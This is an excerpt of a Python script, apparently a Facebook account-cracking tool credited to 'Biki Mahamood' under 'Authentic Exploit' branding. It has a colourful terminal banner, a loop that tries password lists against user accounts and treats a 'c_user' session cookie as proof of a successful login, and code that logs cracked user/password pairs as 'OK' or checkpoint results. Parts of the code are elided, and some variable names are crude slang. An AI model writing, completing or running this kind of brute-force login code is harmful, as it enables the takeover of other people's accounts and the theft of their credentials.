# code by Biki Mahamood
# my facebook ( https://www.facebook.com/bikiterabap )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Biki Mahamood.
...
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS INDIAN [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m BIKI MAHAMOOD       \033[1;31;1m █
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Biki Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[BIKI-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[BIKI-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[BIKI]","\x1b[1;92m[BIKI]","\x1b[1;92m[BIKI]","\x1b[1;92m[BIKI]","\x1b[1;92m[BIKI]","\x1b[1;92m[BIKI]","\x1b[1;92m[BIKI]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[BIKI-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
